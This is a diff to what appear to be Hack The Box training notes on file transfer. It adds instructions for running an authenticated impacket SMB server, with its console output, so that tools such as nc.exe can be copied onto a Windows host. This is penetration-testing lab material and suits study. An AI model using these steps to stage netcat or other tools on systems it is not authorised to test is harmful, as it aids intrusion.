@@ -128,4 +128,18 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ```powershell
 copy \\192.168.220.133\share\nc.exe
 ```
-- However, newer versions of windows block unauthenticated guest access 
+- However, newer versions of windows block unauthenticated guest access so we create a SMB server with username ans password as solution
+#### Create SMB Server with Username and Password
+```bash
+SonithGT@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+```
